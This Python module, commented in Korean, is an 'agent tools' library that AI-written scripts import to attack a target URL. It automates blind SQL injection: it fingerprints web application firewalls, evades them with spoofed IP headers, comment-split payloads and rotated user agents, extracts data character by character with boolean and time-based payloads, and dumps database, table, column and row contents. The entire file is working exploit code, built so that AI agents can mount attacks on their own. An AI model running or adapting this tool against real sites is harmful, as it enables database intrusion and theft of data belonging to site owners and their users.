"""
bingo Agent Tools — AI 스크립트에서 import해서 바로 쓰는 빌트인 툴 라이브러리.
AI가 매번 기본 HTTP/SQLi 로직을 재작성하지 않아도 됨.

사용법 (AI 스크립트 맨 위에):
    import sys, os
    sys.path.insert(0, os.path.expanduser("~/.bingo"))
    from agent_tools import T
    t = T("https://target.com/page?id=1")
"""
from __future__ import annotations
import re, time, random
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    import httpx as _httpx
    _CLIENT = _httpx.Client(
        follow_redirects=True, verify=False, timeout=12,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"}
    )
except ImportError:
    _CLIENT = None  # type: ignore

# ── WAF 시그니처 ──────────────────────────────────────────────────
_WAF_SIGS = {
    "Cloudflare":  ["cf-ray", "_cf_chl", "cloudflare", "attention required"],
    "AWS WAF":     ["x-amzn-requestid", "aws-waf", "awswaf"],
    "ModSecurity": ["mod_security", "modsecurity", "naxsi"],
    "Wordfence":   ["wordfence", "x-fw-hash"],
    "Sucuri":      ["sucuri", "x-sucuri-id"],
    "Akamai":      ["akamai", "x-akamai"],
}

# ── SQL 에러 패턴 ─────────────────────────────────────────────────
_SQL_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql", r"ora-\d{5}",
    r"microsoft ole db", r"sqlite_error",
    r"pg::syntaxerror", r"unclosed quotation mark",
    r"division by zero", r"sql.*error",
    r"invalid input syntax", r"syntax error at or near",
]

# ── WAF 우회 헤더 세트 ────────────────────────────────────────────
_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {},  # 헤더 없이도 시도
]

_UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]


class T:
    """Bingo Agent Tool — 하나의 타겟 URL에 대한 모든 작업 처리."""

    def __init__(self, target_url: str, param: str | None = None):
        self.target = target_url
        self.parsed = urlparse(target_url)
        self.qs = parse_qs(self.parsed.query, keep_blank_values=True)
        # HTML 엔티티 정리
        self.qs = {k.replace("amp;", ""): v for k, v in self.qs.items()}
        self.params = {k: v[0] for k, v in self.qs.items()}
        self.param = param or (list(self.params.keys())[0] if self.params else None)
        self.waf: str | None = None
        self._true_len: int = 0
        self._false_len: int = 0
        self._margin: int = 80

    # ── HTTP 기본 ─────────────────────────────────────────────────
    def get(self, url: str, extra_headers: dict | None = None, retries: int = 2) -> tuple[int, int, str]:
        """GET 요청. (status, length, body) 반환."""
        if _CLIENT is None:
            raise ImportError("httpx not installed")
        hdrs = {"User-Agent": random.choice(_UA_LIST)}
        hdrs.update(extra_headers or {})
        for attempt in range(retries + 1):
            try:
                r = _CLIENT.get(url, headers=hdrs)
                return r.status_code, len(r.text), r.text
            except Exception as e:
                if attempt == retries:
                    return 0, 0, f"[ERROR] {e}"
                time.sleep(1)
        return 0, 0, ""

    def inject(self, payload: str, param: str | None = None,
               extra_headers: dict | None = None) -> tuple[int, int, str]:
        """파라미터에 페이로드 주입 후 요청."""
        p = param or self.param
        if not p:
            return 0, 0, "[ERROR] no param"
        qs = dict(self.qs)
        orig = qs.get(p, [""])[0]
        qs[p] = [orig + payload]
        url = urlunparse((
            self.parsed.scheme, self.parsed.netloc, self.parsed.path,
            self.parsed.params, urlencode(qs, doseq=True), ""
        ))
        return self.get(url, extra_headers)

    def inject_abs(self, payload: str, param: str | None = None,
                   extra_headers: dict | None = None) -> tuple[int, int, str]:
        """파라미터 값을 페이로드로 완전 교체."""
        p = param or self.param
        if not p:
            return 0, 0, "[ERROR] no param"
        qs = dict(self.qs)
        qs[p] = [payload]
        url = urlunparse((
            self.parsed.scheme, self.parsed.netloc, self.parsed.path,
            self.parsed.params, urlencode(qs, doseq=True), ""
        ))
        return self.get(url, extra_headers)

    # ── WAF 탐지 ─────────────────────────────────────────────────
    def detect_waf(self) -> str | None:
        """WAF 탐지. 이름 반환 (없으면 None)."""
        s, l, body = self.get(self.target)
        if s == 0:
            return None
        body_l = body.lower()
        # 헤더 기반 탐지 (실제 응답 헤더는 별도 요청 필요)
        if _CLIENT:
            try:
                r = _CLIENT.get(self.target)
                for waf, sigs in _WAF_SIGS.items():
                    for sig in sigs:
                        if sig in str(r.headers).lower() or sig in r.text.lower()[:2000]:
                            self.waf = waf
                            print(f"[WAF] {waf} detected")
                            return waf
            except Exception:
                pass
        # 블로킹 프로브
        _, _, probe = self.inject("'")
        for waf, sigs in _WAF_SIGS.items():
            for sig in sigs:
                if sig in probe.lower()[:3000]:
                    self.waf = waf
                    print(f"[WAF] {waf} detected via block probe")
                    return waf
        print("[WAF] No WAF detected")
        return None

    def is_waf_blocked(self, body: str, status: int) -> bool:
        """응답이 WAF 차단인지 확인."""
        if status in (403, 406, 429):
            return True
        body_l = body.lower()[:3000]
        block_sigs = ["cloudflare", "attention required", "blocked", "access denied",
                      "_cf_chl", "challenge-form", "turnstile", "sucuri", "wordfence block"]
        return any(sig in body_l for sig in block_sigs)

    # ── SQL 에러 탐지 ─────────────────────────────────────────────
    def has_sql_error(self, body: str) -> str | None:
        """SQL 에러 패턴 탐지. 발견된 패턴 반환."""
        body_l = body.lower()
        for pat in _SQL_ERRORS:
            m = re.search(pat, body_l)
            if m:
                return pat
        return None

    # ── Boolean 기준값 설정 ───────────────────────────────────────
    def calibrate_boolean(self) -> bool:
        """TRUE/FALSE 기준 응답 길이 측정."""
        _, true_len, _ = self.inject(" AND 1=1-- -")
        _, false_len, _ = self.inject(" AND 1=2-- -")
        if true_len == 0 or false_len == 0:
            return False
        diff = abs(true_len - false_len)
        if diff < 50:
            print(f"[BOOL] No length difference (diff={diff}B) — may not be boolean injectable")
            return False
        self._true_len = true_len
        self._false_len = false_len
        self._margin = max(60, diff // 3)
        print(f"[BOOL] Calibrated: true={true_len}B, false={false_len}B, diff={diff}B, margin={self._margin}B")
        return True

    def is_true_response(self, length: int) -> bool:
        return length > 0 and abs(length - self._true_len) < self._margin

    # ── Boolean 추출 (WAF 우회 자동 적용) ────────────────────────
    def bool_extract_len(self, expr: str, max_len: int = 40) -> int:
        """Boolean으로 SQL 표현식의 길이 추출. WAF 우회 자동 시도."""
        # 우회 변형 생성
        def make_variants(i: int) -> list[str]:
            return [
                f" AND {expr}={i}-- -",
                f" AND ({expr})={i}-- -",
                f" AND {i}=({expr})-- -",
                f"/**/AND/**/{expr}={i}-- -",
                f" AND {expr.replace('(', '/**/(').replace(')', ')/**/')}={i}-- -",
            ]

        for i in range(1, max_len + 1):
            for variant in make_variants(i):
                _, length, body = self.inject(variant)
                if self.is_waf_blocked(body, length):
                    continue
                if self.is_true_response(length):
                    return i
            time.sleep(0.1)
        return 0

    def bool_extract_char(self, expr: str, pos: int) -> str:
        """Boolean 이진탐색으로 SQL 표현식의 pos번째 문자 추출."""
        lo, hi = 32, 126
        # 우회 변형 생성
        char_exprs = [
            f"ASCII(MID(({expr}),{pos},1))",
            f"ORD(SUBSTR(({expr}),{pos},1))",
            f"ASCII(SUBSTRING(({expr}),{pos},1))",
        ]
        while lo <= hi:
            mid = (lo + hi) // 2
            found = False
            for ce in char_exprs:
                variants = [
                    f" AND {ce}>{mid}-- -",
                    f"/**/AND/**/{ce}>{mid}-- -",
                    f" AND ({ce})>{mid}-- -",
                ]
                for v in variants:
                    _, length, body = self.inject(v)
                    if self.is_waf_blocked(body, length):
                        continue
                    if self.is_true_response(length):
                        lo = mid + 1
                    else:
                        hi = mid - 1
                    found = True
                    break
                if found:
                    break
            if not found:
                lo = mid + 1
            time.sleep(0.05)
        return chr(lo) if 32 <= lo <= 126 else "?"

    def bool_extract_string(self, expr: str, max_len: int = 40) -> str:
        """Boolean으로 SQL 문자열 표현식 전체 추출."""
        # 길이 추출 시 함수명도 우회
        len_exprs = [
            f"LENGTH({expr})",
            f"CHAR_LENGTH({expr})",
            f"LEN/**/GTH({expr})",
            f"CHAR_LEN/**/GTH({expr})",
        ]
        slen = 0
        for le in len_exprs:
            slen = self.bool_extract_len(le, max_len)
            if slen > 0:
                break

        if slen == 0:
            # 타임기반 폴백
            print(f"[BOOL] Boolean length failed, trying time-based for: {expr}")
            slen = self.time_extract_len(expr, max_len)

        if slen == 0:
            return "[extraction_failed]"

        result = ""
        for pos in range(1, slen + 1):
            ch = self.bool_extract_char(expr, pos)
            result += ch
            print(f"[EXTRACT] {expr}[{pos}/{slen}] = {ch} → {result}")
        return result

    # ── 타임기반 (Boolean 완전 차단 시 폴백) ─────────────────────
    def time_extract_len(self, expr: str, max_len: int = 30, sleep_sec: float = 3.0) -> int:
        """Time-based으로 길이 추출."""
        print(f"[TIME] Extracting length of: {expr}")
        len_exprs = [
            f"LENGTH({expr})",
            f"CHAR_LENGTH({expr})",
        ]
        for le in len_exprs:
            for i in range(1, max_len + 1):
                payload = f" AND IF({le}={i},SLEEP({sleep_sec}),0)-- -"
                t0 = time.time()
                self.inject(payload)
                elapsed = time.time() - t0
                if elapsed >= sleep_sec * 0.8:
                    print(f"[TIME] Length={i} (elapsed={elapsed:.1f}s)")
                    return i
                time.sleep(0.1)
        return 0

    def time_extract_string(self, expr: str, max_len: int = 30, sleep_sec: float = 3.0) -> str:
        """Time-based으로 문자열 추출 (느리지만 WAF 우회 가능)."""
        slen = self.time_extract_len(expr, max_len, sleep_sec)
        if slen == 0:
            return "[time_extraction_failed]"

        result = ""
        for pos in range(1, slen + 1):
            lo, hi = 32, 126
            while lo <= hi:
                mid = (lo + hi) // 2
                payload = f" AND IF(ASCII(MID(({expr}),{pos},1))>{mid},SLEEP({sleep_sec}),0)-- -"
                t0 = time.time()
                self.inject(payload)
                if time.time() - t0 >= sleep_sec * 0.8:
                    lo = mid + 1
                else:
                    hi = mid - 1
                time.sleep(0.05)
            result += chr(lo)
            print(f"[TIME_EXTRACT] [{pos}/{slen}] = {chr(lo)} → {result}")
        return result

    # ── DB 전체 덤프 ─────────────────────────────────────────────
    def dump_databases(self) -> list[str]:
        """DB 목록 추출."""
        print("[DUMP] Extracting database list...")
        count_expr = "SELECT COUNT(*) FROM information_schema.schemata"
        count = self.bool_extract_len(f"({count_expr})", 30)
        if count == 0:
            count = 5  # 폴백

        dbs = []
        for i in range(count):
            expr = f"SELECT schema_name FROM information_schema.schemata LIMIT {i},1"
            db = self.bool_extract_string(f"({expr})")
            if db and "[" not in db:
                dbs.append(db)
                print(f"[DB] {i}: {db}")
        return dbs

    def dump_tables(self, db_name: str) -> list[str]:
        """특정 DB의 테이블 목록 추출."""
        print(f"[DUMP] Extracting tables from {db_name}...")
        hex_db = db_name.encode().hex()
        count_expr = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=0x{hex_db}"
        count = self.bool_extract_len(f"({count_expr})", 50)
        if count == 0:
            return []

        tables = []
        for i in range(count):
            expr = f"SELECT table_name FROM information_schema.tables WHERE table_schema=0x{hex_db} LIMIT {i},1"
            tbl = self.bool_extract_string(f"({expr})")
            if tbl and "[" not in tbl:
                tables.append(tbl)
                print(f"[TABLE] {i}: {tbl}")
        return tables

    def dump_columns(self, db_name: str, table_name: str) -> list[str]:
        """특정 테이블의 컬럼 목록 추출."""
        hex_db  = db_name.encode().hex()
        hex_tbl = table_name.encode().hex()
        count_expr = (
            f"SELECT COUNT(*) FROM information_schema.columns "
            f"WHERE table_schema=0x{hex_db} AND table_name=0x{hex_tbl}"
        )
        count = self.bool_extract_len(f"({count_expr})", 30)
        if count == 0:
            return []

        cols = []
        for i in range(count):
            expr = (
                f"SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema=0x{hex_db} AND table_name=0x{hex_tbl} LIMIT {i},1"
            )
            col = self.bool_extract_string(f"({expr})")
            if col and "[" not in col:
                cols.append(col)
                print(f"[COL] {i}: {col}")
        return cols

    def dump_data(self, db_name: str, table_name: str, columns: list[str],
                  limit: int = 10) -> list[dict]:
        """테이블 데이터 추출."""
        hex_db  = db_name.encode().hex()
        hex_tbl = table_name.encode().hex()
        rows = []
        for i in range(limit):
            row: dict[str, str] = {}
            for col in columns:
                hex_col = col.encode().hex()
                expr = (
                    f"SELECT {col} FROM {db_name}.{table_name} LIMIT {i},1"
                )
                val = self.bool_extract_string(f"({expr})")
                row[col] = val
            if any(v and "[" not in v for v in row.values()):
                rows.append(row)
                print(f"[ROW {i}] {row}")
        return rows


def install_tools():
    """~/.bingo/agent_tools.py 에 복사해서 AI 스크립트에서 import 가능하게 함."""
    import shutil, os
    src = __file__
    dst_dir = os.path.expanduser("~/.bingo")
    os.makedirs(dst_dir, exist_ok=True)
    dst = os.path.join(dst_dir, "agent_tools.py")
    shutil.copy2(src, dst)
    print(f"[OK] agent_tools installed → {dst}")


if __name__ == "__main__":
    install_tools()
